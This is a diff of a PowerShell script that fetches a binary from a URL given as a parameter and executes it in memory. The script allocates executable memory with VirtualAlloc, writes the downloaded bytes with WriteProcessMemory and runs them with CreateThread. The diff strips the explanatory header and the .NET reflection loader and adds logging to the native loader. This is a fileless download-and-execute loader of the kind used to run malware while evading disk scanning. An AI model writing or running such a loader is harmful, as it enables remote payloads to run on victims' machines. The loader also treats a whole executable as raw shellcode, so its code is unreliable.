@@ -1,46 +1,20 @@
-# Custom PowerShell script to execute a C++ binary or payload in memory
 param (
     [string]$Payload
 )
 
 # Function to download and execute a binary in memory
-function Execute-BinaryInMemory {
-    param (
-        [string]$Url
-    )
-    try {
-        # Download the binary into memory as a byte array
-        $webClient = New-Object System.Net.WebClient
-        $binaryData = $webClient.DownloadData($Url)
-        
-        # Load the binary into memory and execute it using reflection
-        $assembly = [System.Reflection.Assembly]::Load($binaryData)
-        $entryPoint = $assembly.EntryPoint
-        
-        if ($entryPoint) {
-            # Invoke the entry point (works for .NET executables; for native C++ binaries, additional steps are needed)
-            $entryPoint.Invoke($null, $null)
-            Write-Output "Executed binary from $Url in memory."
-        } else {
-            Write-Error "No entry point found in the binary. Ensure it's a valid executable."
-        }
-    } catch {
-        Write-Error "Error executing binary in memory: $_"
-    }
-}
-
-# Function to execute native C++ binary in memory (using low-level Windows API)
 function Execute-NativeBinaryInMemory {
     param (
         [string]$Url
     )
     try {
+        Write-Output "Attempting to download binary from $Url"
         # Download the binary into memory as a byte array
         $webClient = New-Object System.Net.WebClient
         $binaryData = $webClient.DownloadData($Url)
-        
+        Write-Output "Downloaded $($binaryData.Length) bytes from $Url"
+
         # Use Windows API to allocate memory and execute the binary
-        # This is a simplified example and may require additional PE parsing for real-world use
         Add-Type -TypeDefinition @"
         using System;
         using System.Runtime.InteropServices;
@@ -62,30 +36,34 @@ function Execute-NativeBinaryInMemory {
         
         # Allocate memory for the binary
         $memSize = $binaryData.Length
+        Write-Output "Allocating $memSize bytes in memory"
         $memPtr = [NativeExecution]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
         
         if ($memPtr -eq [IntPtr]::Zero) {
-            Write-Error "Failed to allocate memory for binary."
+            Write-Error "Failed to allocate memory for binary. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
             return
         }
+        Write-Output "Memory allocated at address: $memPtr"
         
         # Write the binary to the allocated memory
         $bytesWritten = 0
         $success = [NativeExecution]::WriteProcessMemory([IntPtr]::Zero, $memPtr, $binaryData, $memSize, [ref]$bytesWritten)
         
         if (-not $success) {
-            Write-Error "Failed to write binary to memory."
+            Write-Error "Failed to write binary to memory. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
             return
         }
+        Write-Output "Wrote $bytesWritten bytes to memory"
         
         # Create a thread to execute the binary in memory
         $threadId = 0
         $threadHandle = [NativeExecution]::CreateThread([IntPtr]::Zero, 0, $memPtr, [IntPtr]::Zero, 0, [ref]$threadId)
         
         if ($threadHandle -eq [IntPtr]::Zero) {
-            Write-Error "Failed to create thread for execution."
+            Write-Error "Failed to create thread for execution. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
             return
         }
+        Write-Output "Thread created with ID: $threadId"
         
         # Wait for the thread to complete
         [NativeExecution]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
@@ -104,7 +82,7 @@ function Exec {
     
     # Check if the payload is a URL (for downloading a binary)
     if ($Payload -match "^https?://") {
-        # Attempt to execute as a native binary in memory (for C++ executables)
+        # Attempt to execute as a native binary in memory
         Execute-NativeBinaryInMemory -Url $Payload
     }
     else {
